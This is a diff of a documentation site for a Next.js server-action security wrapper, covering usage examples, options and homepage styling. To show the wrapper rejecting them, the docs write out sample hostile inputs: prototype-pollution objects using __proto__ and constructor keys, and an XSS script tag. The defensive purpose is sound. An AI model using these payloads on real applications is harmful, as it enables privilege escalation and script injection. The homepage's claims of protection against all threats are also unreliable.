+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const updateSettings = secureServerAction(
+  async (settings: Settings) => {
+    await db.settings.update(settings);
+    return { success: true };
+  },
+  {
+    sanitizeInputs: true,
+    allowedInputs: ['theme', 'language', 'notifications'], // Only these keys
+  }
+);
+```
+
+### With Depth Limiting
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const processComplexData = secureServerAction(
+  async (data: ComplexData) => {
+    const result = await processData(data);
+    return { success: true, result };
+  },
+  {
+    maxDepth: 5, // Limit nesting to 5 levels
+    sanitizeInputs: true,
+  }
+);
+```
+
+## Options Reference
+
+```typescript
+interface SecureActionOptions {
+  // Require CSRF token validation
+  requireCSRF?: boolean;
+  
+  // Sanitize inputs (remove dangerous keys)
+  sanitizeInputs?: boolean;
+  
+  // Maximum nesting depth
+  maxDepth?: number;
+  
+  // Allowed input keys (whitelist)
+  allowedInputs?: string[];
+  
+  // Rate limit key for this action
+  rateLimitKey?: string;
+}
+```
+
+## Real-World Examples
+
+### Form Submission
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+import { revalidatePath } from 'next/cache';
+
+export const submitContactForm = secureServerAction(
+  async (formData: ContactForm) => {
+    // Validated: no injection, no prototype pollution
+    await db.contacts.create(formData);
+    await sendEmail(formData.email, 'Thank you');
+    
+    revalidatePath('/contact');
+    return { success: true };
+  },
+  {
+    sanitizeInputs: true, // Clean the input
+  }
+);
+
+// Component usage:
+// app/contact/page.tsx
+'use client';
+
+export default function ContactPage() {
+  const handleSubmit = async (e: FormEvent) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    
+    const result = await submitContactForm({
+      name: formData.get('name'),
+      email: formData.get('email'),
+      message: formData.get('message'),
+    });
+    
+    if (result.success) {
+      alert('Form submitted!');
+    }
+  };
+  
+  return <form onSubmit={handleSubmit}>...</form>;
+}
+```
+
+### User Authentication
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const login = secureServerAction(
+  async (username: string, password: string) => {
+    // Validated: no SQL injection in username
+    const user = await authenticateUser(username, password);
+    
+    if (!user) {
+      throw new Error('Invalid credentials');
+    }
+    
+    await createSession(user.id);
+    return { success: true, user };
+  },
+  {
+    sanitizeInputs: true,
+  }
+);
+```
+
+### Data Update
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const updateUser = secureServerAction(
+  async (userId: string, updates: UserUpdates) => {
+    // Dangerous keys removed automatically
+    // No __proto__, constructor, prototype
+    
+    await db.users.update(userId, updates);
+    return { success: true };
+  },
+  {
+    sanitizeInputs: true,
+    allowedInputs: ['name', 'email', 'bio'], // Only these fields
+  }
+);
+```
+
+### File Upload Processing
+
+```typescript
+// app/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const processUpload = secureServerAction(
+  async (fileMetadata: FileMetadata) => {
+    // Metadata validated for injection
+    const result = await processFile(fileMetadata);
+    return { success: true, result };
+  },
+  {
+    sanitizeInputs: true,
+    maxDepth: 3, // Shallow metadata only
+  }
+);
+```
+
+### Admin Operations
+
+```typescript
+// app/admin/actions.ts
+'use server';
+
+import { secureServerAction } from '@/lib/fortress';
+
+export const promoteUser = secureServerAction(
+  async (userId: string, role: string, metadata: ActionMetadata) => {
+    // CSRF validated
+    // Inputs sanitized
+    
+    await db.users.update(userId, { role });
+    return { success: true };
+  },
+  {
+    requireCSRF: true,
+    sanitizeInputs: true,
+  }
+);
+```
+
+## Input Sanitization
+
+The wrapper automatically removes dangerous keys:
+
+```typescript
+// Input:
+{
+  name: "John",
+  email: "john@example.com",
+  __proto__: { isAdmin: true },
+  constructor: { prototype: { hacked: true } }
+}
+
+// After sanitization:
+{
+  name: "John",
+  email: "john@example.com"
+}
+// __proto__ and constructor removed!
+```
+
+### Nested Sanitization
+
+```typescript
+// Input:
+{
+  user: {
+    profile: {
+      name: "John",
+      __proto__: { admin: true }
+    }
+  }
+}
+
+// After sanitization:
+{
+  user: {
+    profile: {
+      name: "John"
+    }
+  }
+}
+// Dangerous keys removed at all levels
+```
+
+## Error Handling
+
+### Validation Error
+
+```typescript
+// Client code:
+try {
+  await updateProfile(userId, {
+    __proto__: { isAdmin: true }
+  });
+} catch (error) {
+  if (error instanceof SecurityError) {
+    console.error('Security validation failed:', error.message);
+    // Error: "Dangerous key detected: __proto__"
+  }
+}
+```
+
+### Injection Detected
+
+```typescript
+try {
+  await createPost(
+    "Title",
+    "Content with <script>alert(1)</script>"
+  );
+} catch (error) {
+  // Error: "XSS injection detected: <script>"
+}
+```
+
+### CSRF Validation Failed
+
+```typescript
+try {
+  await deleteAccount(userId, {
+    _csrf: 'invalid-token'
+  });
+} catch (error) {
+  // Error: "CSRF validation failed"
+}
+```
+
+## Client-Side Usage
+
+### With Form
+
+```typescript
+// app/profile/page.tsx
+'use client';
+
+import { updateProfile } from '@/app/actions';
+
+export default function ProfilePage() {
+  const handleSubmit = async (formData: FormData) => {
+    try {
+      const result = await updateProfile(
+        userId,
+        {
+          name: formData.get('name'),
+          bio: formData.get('bio'),
+        }
+      );
+      
+      if (result.success) {
+        toast.success('Profile updated!');
+      }
+    } catch (error) {
+      if (error instanceof Error) {
+        toast.error(error.message);
+      }
+    }
+  };
+  
+  return <form action={handleSubmit}>...</form>;
+}
+```
+
+### With State Management
+
+```typescript
+// app/posts/page.tsx
+'use client';
+
+import { useState } from 'react';
+import { createPost } from '@/app/actions';
+
+export default function CreatePostPage() {
+  const [loading, setLoading] = useState(false);
+  
+  const handleCreate = async (title: string, content: string) => {
+    setLoading(true);
+    
+    try {
+      const result = await createPost(title, content);
+      
+      if (result.success) {
+        router.push('/posts');
+      }
+    } catch (error) {
+      console.error('Failed to create post:', error);
+    } finally {
+      setLoading(false);
+    }
+  };
+  
+  return <PostForm onSubmit={handleCreate} />;
+}
+```
+
+## Summary
+
+**secureServerAction wrapper provides:**
+- Automatic argument validation
+- Input sanitization
+- CSRF protection
+- Injection detection
+- Prototype pollution prevention
+
+**How to use:**
+```typescript
+export const action = secureServerAction(
+  async (data: Data) => {
+    // Your logic here
+  },
+  {
+    sanitizeInputs: true,
+    requireCSRF: false,
+  }
+);
+```
+
+---
+
+**Related Documentation:**
+- [API Routes Wrapper](./api-route.md)
+- [CSRF Protection](../modules/csrf/csrf-protection.md)
+
+
+================================================
+FILE: src/components/HomepageFeatures/index.tsx
+================================================
+import type {ReactNode} from 'react';
+import clsx from 'clsx';
+import Heading from '@theme/Heading';
+import { Shield, Zap, Layers, Ghost, Settings, BarChart3 } from 'lucide-react';
+import styles from './styles.module.css';
+
+type FeatureItem = {
+  title: string;
+  icon: ReactNode;
+  description: ReactNode;
+};
+
+const FeatureList: FeatureItem[] = [
+  {
+    title: 'CVE-2025-55182 Protection',
+    icon: <Shield size={48} />,
+    description: (
+      <>
+        Complete protection against React2Shell vulnerability. Blocks prototype 
+        pollution, dangerous keys, and all attack vectors targeting React Server 
+        Components.
+      </>
+    ),
+  },
+  {
+    title: 'Zero Performance Impact',
+    icon: <Zap size={48} />,
+    description: (
+      <>
+        Less than 1ms overhead per request. Optimized validation algorithms ensure 
+        your application stays fast while remaining secure against all threats.
+      </>
+    ),
+  },
+  {
+    title: '7 Layers of Protection',
+    icon: <Layers size={48} />,
+    description: (
+      <>
+        Deserialization, Injection Detection, Encoding Validation, CSRF, Rate 
+        Limiting, Content Validation, and Security Headers - all working together.
+      </>
+    ),
+  },
+  {
+    title: 'Ghost Mode Defense',
+    icon: <Ghost size={48} />,
+    description: (
+      <>
+        Detects UTF-16LE encoding bypasses that trick WAFs. Prevents sophisticated 
+        attackers from using encoding tricks to deliver malicious payloads.
+      </>
+    ),
+  },
+  {
+    title: 'Zero Configuration',
+    icon: <Settings size={48} />,
+    description: (
+      <>
+        Works out of the box with sensible defaults. Add one middleware file and 
+        your entire Next.js application is protected. Customize when needed.
+      </>
+    ),
+  },
+  {
+    title: 'Security Logging',
+    icon: <BarChart3 size={48} />,
+    description: (
+      <>
+        Comprehensive security event logging with severity levels, confidence 
+        scores, and attack details. Send events to Sentry, DataDog, or your SIEM.
+      </>
+    ),
+  },
+];
+
+function Feature({title, icon, description}: FeatureItem) {
+  return (
+    <div className={clsx('col col--4', styles.featureCard)}>
+      <div className={styles.featureCardInner}>
+        <div className="text--center">
+          <div className={styles.featureIcon}>{icon}</div>
+        </div>
+        <div className="text--center padding-horiz--md">
+          <Heading as="h3">{title}</Heading>
+          <p>{description}</p>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+export default function HomepageFeatures(): ReactNode {
+  return (
+    <section className={styles.features}>
+      <div className="container">
+        <div className="row">
+          {FeatureList.map((props, idx) => (
+            <Feature key={idx} {...props} />
+          ))}
+        </div>
+      </div>
+    </section>
+  );
+}
+
+
+================================================
+FILE: src/components/HomepageFeatures/styles.module.css
+================================================
+/* ==================== THEME VARIABLES ==================== */
+:root {
+  /* Light Theme */
+  --feature-bg: #ffffff;
+  --feature-card-bg: rgba(255, 255, 255, 0.8);
+  --feature-card-border: rgba(0, 0, 0, 0.1);
+  --feature-icon-bg: #fafafa;
+  --feature-icon-border: rgba(220, 38, 38, 0.2);
+  --text-feature: #1a1a1a;
+  --text-feature-desc: #4a4a4a;
+  --accent-red: #dc2626;
+  --accent-red-hover: #b91c1c;
+  --accent-red-light: #fee2e2;
+  
+  /* Shadows */
+  --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.08);
+  --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
+  --shadow-red: 0 4px 16px rgba(220, 38, 38, 0.15);
+}
+
+[data-theme='dark'] {
+  /* Dark Theme - Clean and Clear */
+  --feature-bg: #1a1a1a;
+  --feature-card-bg: rgba(38, 38, 38, 0.8);
+  --feature-card-border: rgba(255, 255, 255, 0.1);
+  --feature-icon-bg: #262626;
+  --feature-icon-border: rgba(220, 38, 38, 0.25);
+  --text-feature: #ffffff;
+  --text-feature-desc: #e5e5e5;
+  --accent-red: #dc2626;
+  --accent-red-hover: #b91c1c;
+  --accent-red-light: #3f1515;
+  
+  /* Shadows */
+  --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
+  --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.4);
+  --shadow-red: 0 4px 16px rgba(220, 38, 38, 0.2);
+}
+
+/* Scroll animations */
+@keyframes fadeInScale {
+  from {
+    opacity: 0;
+    transform: scale(0.95);
+  }
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+/* ==================== FEATURES SECTION ==================== */
+.features {
+  display: grid;
+  grid-template-columns: 1fr;
+  gap: 3rem;
+  padding: 5rem 2rem;
+  width: 100%;
+  background: var(--feature-bg);
+  align-items: start;
+  position: relative;
+  transition: background 0.3s ease;
+}
+
+/* Container sizing */
+.features .container { 
+  max-width: 1200px; 
+  margin: 0 auto;
+  position: relative;
+  z-index: 1;
+}
+
+/* Grid row becomes responsive grid of feature cards */
+.features .row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 2.5rem;
+  width: 100%;
+}
+
+/* Feature card wrapper */
+.featureCard {
+  display: flex;
+  flex-direction: column;
+  animation: fadeInScale 0.5s ease-out backwards;
+}
+
+.featureCard:nth-last-child(-n + 3) {
+  margin-top: 50px;
+}
+
+
+.featureCard:nth-child(1) {
+  animation-delay: 0.1s;
+}
+
+.featureCard:nth-child(2) {
+  animation-delay: 0.15s;
+}
+
+.featureCard:nth-child(3) {
+  animation-delay: 0.2s;
+}
+
+.featureCard:nth-child(4) {
+  animation-delay: 0.25s;
+}
+
+.featureCard:nth-child(5) {
+  animation-delay: 0.3s;
+}
+
+.featureCard:nth-child(6) {
+  animation-delay: 0.35s;
+}
+
+/* Feature card with glassmorphism */
+.featureCardInner {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+  height: 100%;
+  padding: 2rem 1.5rem;
+  border-radius: 16px;
+  
+  /* Glassmorphism effect */
+  background: var(--feature-card-bg);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  
+  /* Border with red tint */
+  border: 2px solid var(--feature-card-border);
+  
+  /* Enhanced shadows */
+  box-shadow: 0 10px 36px rgba(220, 38, 38, 0.12),
+              inset 0 1px 0 rgba(255, 255, 255, 0.08);
+  
+  transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1),
+              box-shadow 0.4s ease,
+              border-color 0.4s ease,
+              background 0.4s ease;
+  position: relative;
+  overflow: hidden;
+}
+
+/* Hover glow effect */
+.featureCardInner::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: radial-gradient(circle, rgba(220, 38, 38, 0.15) 0%, transparent 70%);
+  opacity: 0;
+  transition: opacity 0.4s ease;
+  pointer-events: none;
+}
+
+.featureCardInner:hover::before {
+  opacity: 0.6;
+}
+
+.featureCardInner:hover {
+  transform: translateY(-8px);
+  border-color: var(--accent-red);
+  background: var(--accent-red-light);
+  box-shadow: 0 18px 56px rgba(220, 38, 38, 0.18),
+              0 0 80px rgba(220, 38, 38, 0.1),
+              inset 0 1px 0 rgba(255, 255, 255, 0.12);
+}
+
+/* Icon tile with enhanced glassmorphism */
+.featureIcon {
+  height: 120px;
+  width: 120px;
+  display: grid;
+  place-items: center;
+  margin: 0 auto 1rem;
+  border-radius: 18px;
+  
+  /* Glassmorphism for icon */
+  background: var(--feature-icon-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  
+  /* Red tinted border */
+  border: 2px solid var(--feature-icon-border);
+  
+  /* Enhanced red glow */
+  box-shadow: 0 12px 40px rgba(220, 38, 38, 0.12),
+              inset 0 1px 0 rgba(255, 255, 255, 0.08);
+  
+  transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), 
+              box-shadow 0.4s ease,
+              border-color 0.4s ease,
+              background 0.4s ease;
+  position: relative;
+  color: var(--accent-red);
+}
+
+/* Icon hover glow */
+.featureIcon::before {
+  content: '';
+  position: absolute;
+  inset: -4px;
+  background: linear-gradient(135deg, rgba(220, 38, 38, 0.2), transparent);
+  border-radius: 20px;
+  opacity: 0;
+  transition: opacity 0.4s ease;
+  z-index: -1;
+  filter: blur(16px);
+}
+
+.featureCardInner:hover .featureIcon {
+  transform: translateY(-6px) scale(1.05);
+  border-color: var(--accent-red);
+  background: var(--accent-red-light);
+  box-shadow: 0 20px 60px rgba(220, 38, 38, 0.18),
+              0 0 80px rgba(220, 38, 38, 0.08),
+              inset 0 1px 0 rgba(255, 255, 255, 0.12);
+}
+
+.featureCardInner:hover .featureIcon::before {
+  opacity: 1;
+}
+
+/* Title & text */
+.features h3 {
+  font-size: 1.15rem;
+  font-weight: 600;
+  margin: 0 0 0.75rem;
+  color: var(--text-feature);
+  text-align: center;
+  transition: color 0.3s ease;
+}
+
+.featureCardInner:hover h3 {
+  color: var(--accent-red);
+}
+
+.features p {
+  font-size: 0.95rem;
+  color: var(--text-feature-desc);
+  line-height: 1.7;
+  text-align: center;
+  margin: 0 auto;
+  max-width: 36ch;
+}
+
+/* Responsive adjustments */
+@media screen and (max-width: 996px) {
+  .features { 
+    padding: 4rem 1.5rem;
+  }
+  
+  .featureIcon { 
+    height: 110px; 
+    width: 110px; 
+  }
+  
+  .features .row {
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 2rem;
+  }
+
+  .featureCardInner {
+    padding: 1.75rem 1.25rem;
+  }
+}
+
+@media screen and (max-width: 600px) {
+  .features { 
+    padding: 3rem 1rem;
+  }
+  
+  .featureIcon { 
+    height: 100px; 
+    width: 100px; 
+  }
+  
+  .features .row { 
+    gap: 1.5rem;
+    grid-template-columns: 1fr;
+  }
+
+  .featureCardInner {
+    padding: 1.5rem 1rem;
+  }
+  
+  .features h3 { 
+    font-size: 1.05rem; 
+  }
+  
+  .features p { 
+    font-size: 0.9rem; 
+  }
+}
+
+/* Accessibility */
+@media (prefers-reduced-motion: reduce) {
+  .featureIcon,
+  .featureCardInner,
+  .features h3 {
+    transition-duration: 0.01ms !important;
+    animation: none !important;
+  }
+}
+
+
+================================================
+FILE: src/css/custom.css
+================================================
+/**
+ * Any CSS included here will be global. The classic template
+ * bundles Infima by default. Infima is a CSS framework designed to
+ * work well for content-centric websites.
+ */
+
+/* You can override the default Infima variables here. */
+:root {
+  --ifm-color-primary: #dc2626;
+  --ifm-color-primary-dark: #c71f1f;
+  --ifm-color-primary-darker: #bc1d1d;
+  --ifm-color-primary-darkest: #9b1818;
+  --ifm-color-primary-light: #e03939;
+  --ifm-color-primary-lighter: #e54545;
+  --ifm-color-primary-lightest: #ef5c5c;
+  --ifm-code-font-size: 95%;
+  --docusaurus-highlighted-code-line-bg: rgba(0, 0, 0, 0.1);
+}
+
+/* For readability concerns, you should choose a lighter palette in dark mode. */
+[data-theme='dark'] {
+  --ifm-color-primary: #ef4444;
+  --ifm-color-primary-dark: #dc2626;
+  --ifm-color-primary-darker: #d01d1d;
+  --ifm-color-primary-darkest: #b91c1c;
+  --ifm-color-primary-light: #f87171;
+  --ifm-color-primary-lighter: #f97979;
+  --ifm-color-primary-lightest: #fca5a5;
+  --docusaurus-highlighted-code-line-bg: rgba(0, 0, 0, 0.3);
+}
+
+
+================================================
+FILE: src/pages/index.module.css
+================================================
+/* ==================== THEME VARIABLES ==================== */
+:root {
+  /* Light Theme */
+  --bg-primary: #ffffff;
+  --bg-secondary: #fafafa;
+  --bg-tertiary: #f5f5f5;
+  --text-primary: #1a1a1a;
+  --text-secondary: #4a4a4a;
+  --text-muted: #737373;
+  
+  /* Red Accents */
+  --accent-red: #dc2626;
+  --accent-red-hover: #b91c1c;
+  --accent-red-light: #fee2e2;
+  
+  /* Glass Effects */
+  --glass-bg: rgba(255, 255, 255, 0.8);
+  --glass-border: rgba(220, 38, 38, 0.15);
+  --border-subtle: rgba(0, 0, 0, 0.1);
+  
+  /* Shadows */
+  --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.08);
+  --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
+  --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
+  --shadow-red: 0 4px 16px rgba(220, 38, 38, 0.15);
+}
+
+[data-theme='dark'] {
+  /* Dark Theme - Clean and Clear */
+  --bg-primary: #1a1a1a;
+  --bg-secondary: #262626;
+  --bg-tertiary: #333333;
+  --text-primary: #ffffff;
+  --text-secondary: #e5e5e5;
+  --text-muted: #a3a3a3;
+  
+  /* Same Red Accents */
+  --accent-red: #dc2626;
+  --accent-red-hover: #b91c1c;
+  --accent-red-light: #3f1515;
+  
+  /* Glass Effects */
+  --glass-bg: rgba(38, 38, 38, 0.8);
+  --glass-border: rgba(220, 38, 38, 0.2);
+  --border-subtle: rgba(255, 255, 255, 0.1);
+  
+  /* Shadows */
+  --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
+  --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.4);
+  --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.5);
+  --shadow-red: 0 4px 16px rgba(220, 38, 38, 0.2);
+}
+
+/* ==================== ANIMATIONS ==================== */
+@keyframes fadeInDown {
+  from {
+    opacity: 0;
+    transform: translateY(-20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes fadeInUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes scaleIn {
+  from {
+    opacity: 0;
+    transform: scale(0.95);
+  }
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+@keyframes gridPulse {
+  0%, 100% {
+    opacity: 0.3;
+  }
+  50% {
+    opacity: 0.6;
+  }
+}
+
+@keyframes gridShift {
+  0% {
+    background-position: 0 0;
+  }
+  100% {
+    background-position: 40px 40px;
+  }
+}
+
+@keyframes slideInFromLeft {
+  from {
+    opacity: 0;
+    transform: translateX(-50px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+/* ==================== HERO BANNER ==================== */
+.heroBanner {
+  padding: 4rem 2rem 5rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  transition: background 0.3s ease;
+}
+
+.heroContent {
+  max-width: 1000px;
+  margin: 0 auto;
+  position: relative;
+  z-index: 1;
+}
+
+/* Hero Main Content */
+.heroMainContent {
+  padding: 3rem 2.5rem;
+  margin-bottom: 3rem;
+  border-radius: 20px;
+  background: var(--glass-bg);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 2px solid var(--glass-border);
+  box-shadow: 0 16px 48px rgba(220, 38, 38, 0.12),
+              inset 0 1px 0 rgba(255, 255, 255, 0.1);
+  transition: all 0.4s ease;
+}
+
+.heroMainContent:hover {
+  border-color: var(--accent-red);
+  box-shadow: 0 20px 60px rgba(220, 38, 38, 0.18),
+              0 0 80px rgba(220, 38, 38, 0.1),
+              inset 0 1px 0 rgba(255, 255, 255, 0.15);
+}
+
+/* Fortress Title */
+.fortressTitle {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  animation: fadeInDown 0.6s ease-out;
+}
+
+.fortressTitle h1 {
+  margin: 0;
+  font-size: 3.5rem;
+  font-weight: 800;
+  letter-spacing: -0.02em;
+  background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-red-hover) 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+/* Hero Text */
+.heroSubtitle {
+  font-size: 1.5rem;
+  margin-bottom: 1rem;
+  color: var(--text-primary);
+  animation: fadeInDown 0.6s ease-out 0.1s both;
+  font-weight: 600;
+}
+
+.heroDescription {
+  font-size: 1.1rem;
+  margin-bottom: 2rem;
+  color: var(--text-secondary);
+  line-height: 1.7;
+  animation: fadeInDown 0.6s ease-out 0.2s both;
+  max-width: 700px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* Security Badges */
+.securityBadges {
+  display: flex;
+  gap: 1rem;
+  justify-content: center;
+  flex-wrap: wrap;
+  margin-bottom: 2rem;
+  animation: fadeInUp 0.6s ease-out 0.3s both;
+}
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.75rem 1.4rem;
+  background: var(--glass-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border-radius: 25px;
+  border: 2px solid var(--glass-border);
+  font-size: 0.95rem;
+  font-weight: 600;
+  color: var(--accent-red);
+  transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  box-shadow: 0 4px 16px rgba(220, 38, 38, 0.1),
+              inset 0 1px 0 rgba(255, 255, 255, 0.08);
+}
+
+.badge:hover {
+  background: var(--accent-red-light);
+  border-color: var(--accent-red);
+  transform: translateY(-3px);
+  box-shadow: 0 8px 24px rgba(220, 38, 38, 0.2);
+}
+
+.badgeIcon {
+  display: flex;
+  align-items: center;
+  color: var(--accent-red);
+}
+
+/* Buttons */
+.buttons {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 1rem;
+  margin-bottom: 3rem;
+  animation: fadeInUp 0.6s ease-out 0.4s both;
+}
+
+.buttons .button {
+  border-radius: 8px;
+  font-weight: 600;
+  padding: 0.9rem 2rem;
+  transition: all 0.3s ease;
+  font-size: 1rem;
+  border: none;
+}
+
+.buttons .button--primary {
+  background: var(--accent-red);
+  color: white;
+  box-shadow: var(--shadow-red);
+}
+
+.buttons .button--primary:hover {
+  background: var(--accent-red-hover);
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(220, 38, 38, 0.25);
+}
+
+.buttons .button--secondary {
+  background: var(--glass-bg);
+  border: 1px solid var(--glass-border);
+  color: var(--accent-red);
+  font-weight: 600;
+  backdrop-filter: blur(10px);
+}
+
+.buttons .button--secondary:hover {
+  background: var(--accent-red-light);
+  border-color: var(--accent-red);
+  transform: translateY(-2px);
+  box-shadow: var(--shadow-sm);
+}
+
+/* Code Preview */
+.codePreview {
+  max-width: 750px;
+  margin: 0 auto 4rem;
+  background: var(--glass-bg);
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: 0 12px 40px rgba(220, 38, 38, 0.15),
+              inset 0 1px 0 rgba(255, 255, 255, 0.08);
+  animation: scaleIn 0.6s ease-out 0.5s both;
+  border: 2px solid var(--glass-border);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+  position: relative;
+}
+
+.codePreview:hover {
+  transform: translateY(-8px);
+  border-color: var(--accent-red);
+  box-shadow: 0 20px 60px rgba(220, 38, 38, 0.22),
+              0 0 80px rgba(220, 38, 38, 0.12),
+              inset 0 1px 0 rgba(255, 255, 255, 0.12);
+}
+
+.codeHeader {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.9rem 1rem;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border-subtle);
+}
+
+.codeDot {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  box-shadow: var(--shadow-sm);
+}
+
+.codeTitle {
+  margin-left: auto;
+  color: var(--text-muted);
+  font-size: 0.85rem;
+  font-weight: 500;
+}
+
+.codeContent {
+  padding: 1.5rem;
+  margin: 0;
+  text-align: left;
+  background: var(--bg-tertiary);
+}
+
+.codeContent code {
+  color: var(--text-secondary) !important;
+  font-family: 'Monaco', 'Menlo', 'Courier New', monospace !important;
+  font-size: 0.9rem !important;
+  line-height: 1.7 !important;
+  display: block;
+  white-space: pre;
+}
+
+/* Stats Container */
+.statsContainer {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+  gap: 1.5rem;
+  max-width: 800px;
+  margin: 0 auto;
+  animation: fadeInUp 0.6s ease-out 0.6s both;
+}
+
+.stat {
+  text-align: center;
+  padding: 2rem 1rem;
+  border-radius: 12px;
+  background: var(--glass-bg);
+  border: 2px solid var(--border-subtle);
+  transition: all 0.3s ease;
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  box-shadow: 0 8px 24px rgba(220, 38, 38, 0.1),
+              inset 0 1px 0 rgba(255, 255, 255, 0.08);
+  animation: scaleIn 0.6s ease-out backwards;
+}
+
+.stat:nth-child(1) {
+  animation-delay: 1.6s;
+}
+
+.stat:nth-child(2) {
+  animation-delay: 1.7s;
+}
+
+.stat:nth-child(3) {
+  animation-delay: 1.8s;
+}
+
+.stat:nth-child(4) {
+  animation-delay: 1.9s;
+}
+
+.stat:hover {
+  background: var(--accent-red-light);
+  border-color: var(--accent-red);
+  transform: translateY(-5px);
+  box-shadow: 0 12px 40px rgba(220, 38, 38, 0.18);
+}
+
+.statNumber {
+  font-size: 3rem;
+  font-weight: 800;
+  background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-red-hover) 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 0.5rem;
+}
+
+.statLabel {
+  font-size: 0.9rem;
+  color: var(--text-muted);
+  font-weight: 500;
+}
+
+/* Alert Banner */
+.alertBanner {
+  background: var(--accent-red);
+  padding: 1rem 0;
+  color: white;
+  box-shadow: var(--shadow-sm);
+}
+
+.alertContent {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  justify-content: center;
+  flex-wrap: wrap;
+}
+
+.alertIcon {
+  display: flex;
+  align-items: center;
+  color: white;
+}
+
+.alertText {
+  font-size: 0.95rem;
+  flex: 1;
+  min-width: 300px;
+  line-height: 1.5;
+}
+
+.alertText strong {
+  font-weight: 700;
+}
+
+/* Quick Start Section */
+.quickStartSection {
+  padding: 4rem 2rem;
+  background: var(--bg-secondary);
+}
+
+.sectionTitle {
+  text-align: center;
+  font-size: 2.5rem;
+  margin-bottom: 3rem;
+  background: linear-gradient(135deg, var(--accent-red), var(--accent-red-hover));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  font-weight: 700;
+}
+
+.stepsContainer {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 2rem;
+  max-width: 1100px;
+  margin: 0 auto;
+}
+
+.step {
+  position: relative;
+  padding: 2.5rem;
+  background: var(--glass-bg);
+  border-radius: 14px;
+  box-shadow: 0 10px 32px rgba(220, 38, 38, 0.12),
+              inset 0 1px 0 rgba(255, 255, 255, 0.08);
+  transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  border: 2px solid var(--border-subtle);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  animation: slideInFromLeft 0.6s ease-out backwards;
+}
+
+.step:nth-child(1) {
+  animation-delay: 0.2s;
+}
+
+.step:nth-child(2) {
+  animation-delay: 0.4s;
+}
+
+.step:nth-child(3) {
+  animation-delay: 0.6s;
+}
+
+.step:hover {
+  transform: translateY(-6px);
+  box-shadow: 0 16px 48px rgba(220, 38, 38, 0.18),
+              0 0 60px rgba(220, 38, 38, 0.08);
+  border-color: var(--accent-red);
+}
+
+.stepNumber {
+  position: absolute;
+  top: -1.25rem;
+  left: 1.5rem;
+  width: 3rem;
+  height: 3rem;
+  background: var(--accent-red);
+  color: white;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.5rem;
+  font-weight: 700;
